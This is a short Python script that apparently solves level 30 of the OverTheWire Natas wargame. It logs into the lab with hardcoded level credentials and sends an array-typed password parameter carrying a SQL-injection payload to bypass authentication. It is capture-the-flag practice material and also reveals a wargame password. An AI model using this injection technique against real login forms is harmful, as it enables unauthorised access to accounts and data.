import requests
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth("natas30","WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH")
url = "http://natas30.natas.labs.overthewire.org/"
data = {
  "username":"natas31",
  "password":["'lol' or 1",4]
}
r = requests.post(url,data,auth=basicAuth,verify=False)
print(r.text)